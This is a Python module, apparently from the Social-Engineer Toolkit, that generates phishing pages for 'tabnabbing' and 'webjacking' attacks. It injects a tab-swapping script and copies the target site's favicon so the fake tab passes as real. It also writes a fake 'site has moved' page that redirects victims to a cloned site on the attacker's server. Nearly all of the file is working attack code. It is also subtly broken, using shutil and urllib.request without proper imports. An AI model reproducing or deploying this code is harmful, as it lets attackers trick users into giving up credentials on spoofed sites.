import subprocess
import re
import urllib
import os
from src.core.setcore import *
apache_check = check_config("APACHE_SERVER=").lower()
if apache_check == "on": apache_dir = check_config("APACHE_DIRECTORY=").lower()
webjacking_timing = check_config("WEBJACKING_TIME=")
fileopen = open(userconfigpath + "attack_vector", "r")
for line in fileopen:
    attack_vector = line.rstrip()
multi_webjacking = "off"
if os.path.isfile(userconfigpath + "multi_webjacking"):
    multi_webjacking = "on"
ipaddr = ""
if check_options("IPADDR=") != 0:
    ipaddr = check_options("IPADDR=")
fileopen = open(userconfigpath + "site.template", "r").readlines()
for line in fileopen:
    match = re.search("URL=", line)
    if match:
        URL = line.replace("URL=", "")
        if attack_vector == "tabnabbing":
            URL = URL.replace("https://", "")
            URL = URL.replace("http://", "")
            URL = re.split("/", URL)
            URL = URL[0]
            URL = "http://" + URL
subprocess.Popen("mv %s/web_clone/index.html %s/web_clone/index2.html" %
                 (userconfigpath, userconfigpath), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
fileopen = open("src/webattack/tabnabbing/source.js", "r")
filewrite = open(userconfigpath + "web_clone/source.js", "w")
for line in fileopen:
    line = line.rstrip()
    match = re.search("URLHERE", line)
    if match:
        line = line.replace("URLHERE", URL)
    filewrite.write(line + "\n")
filewrite.close()
if attack_vector == "tabnabbing":
    favicon = urllib.request.urlopen("%s/favicon.ico" % (URL))
    output = open(userconfigpath + '/web_clone/favicon.ico', 'wb')
    output.write(favicon.read())
    output.close()
    filewrite1 = open(userconfigpath + "web_clone/index.html", "w")
    filewrite1.write(
        '<head><script type="text/javascript" src="source.js"></script></head>\n')
    filewrite1.write("<body>\n")
    filewrite1.write("Please wait while the site loads...\n")
    filewrite1.write("</body>\n")
    filewrite1.close()
    if apache_check == "on": shutil.copy(userconfigpath + "web_clone/source.js", apache_dir)
if attack_vector == "webjacking" or multi_webjacking == "on":
    filewrite1 = open(userconfigpath + "web_clone/index.html", "w")
    filewrite1.write("<script>\n")
    filewrite1.write("function a(){\n")
    filewrite1.write(
        '''a= window.open("http://%s/index2.html", "iframe", "");\n''' % (ipaddr))
    filewrite1.write("}\n")
    filewrite1.write("</script>\n")
    filewrite1.write('''<a href="%s" onclick="t=setTimeout('a()', %s);" target="iframe"><h1>The site %s has moved, click here to go to the new location.</h1></a>\n''' %
                     (URL, webjacking_timing, URL))
    filewrite1.close()